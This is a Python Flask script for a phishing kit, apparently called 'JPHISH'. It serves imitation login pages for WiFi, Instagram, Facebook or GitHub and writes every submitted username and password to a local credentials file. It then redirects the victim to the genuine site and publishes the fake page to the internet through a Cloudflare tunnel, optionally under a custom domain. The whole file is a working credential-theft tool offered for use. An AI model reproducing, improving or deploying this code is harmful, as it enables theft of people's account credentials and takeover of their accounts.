from flask import Flask, request, render_template, redirect
from datetime import datetime
import os
import subprocess
import shutil

app = Flask(__name__, template_folder="templates")

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] {service}: {username}:{password}\n")

# Check if running on Termux (Android)
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Install Cloudflared (for tunneling)
def install_cloudflared():
    try:
        if is_termux():
            subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
        return True
    except Exception as e:
        print(f"[!] Failed to install Cloudflared: {e}")
        return False

# Start Cloudflared tunnel
def start_cloudflared(port=80, custom_domain=None):
    tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
    if not tool_path:
        if input("Install Cloudflared? (y/n): ").lower() == "y":
            if not install_cloudflared():
                return None
            tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
        else:
            return None

    cmd = [tool_path, "tunnel", "--url", f"http://localhost:{port}"]
    if custom_domain:
        cmd.extend(["--hostname", custom_domain])

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(5)
        for line in process.stderr:
            if "trycloudflare.com" in line or (custom_domain and custom_domain in line):
                public_url = line.split("|")[-1].strip()
                print(f"[+] Public URL: {public_url}")
                return public_url
        return None
    except Exception as e:
        print(f"[!] Cloudflared error: {e}")
        return None

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. WiFi")
    print("2. Instagram")
    print("3. Facebook")
    print("4. GitHub")
    choice = input("\nEnter choice (1-4): ").strip()

    print("\n[+] Select Tunnel:")
    print("1. Cloudflared (Recommended)")
    print("2. Localhost (No tunnel)")
    tunnel_choice = input("Enter choice (1/2): ").strip()

    # Start tunnel
    public_url = None
    if tunnel_choice == "1":
        custom_domain = input("Custom domain (leave blank for default): ").strip() or None
        public_url = start_cloudflared(custom_domain=custom_domain)
    elif tunnel_choice == "2":
        print("[+] Running on localhost (no tunnel).")
    else:
        print("[!] Invalid choice.")
        sys.exit(1)

    # Configure Flask routes
    services = {
        "1": {"template": "wifi.html", "redirect": "https://google.com"},
        "2": {"template": "instagram.html", "redirect": "https://instagram.com"},
        "3": {"template": "facebook.html", "redirect": "https://facebook.com"},
        "4": {"template": "github.html", "redirect": "https://github.com"}
    }

    @app.route('/')
    def home():
        return render_template(services[choice]["template"])

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password') or request.form.get('pass')
        service = services[choice]["template"].replace('.html', '')
        log_credentials(username, password, service)
        return redirect(services[choice]["redirect"], code=302)

    if public_url:
        print(f"\n[+] Phishing page active: {public_url}")
    else:
        print("\n[+] Phishing page running locally: http://localhost:80")

    app.run(host='0.0.0.0', port=80)

if __name__ == '__main__':
    import time
    import sys
    setup()
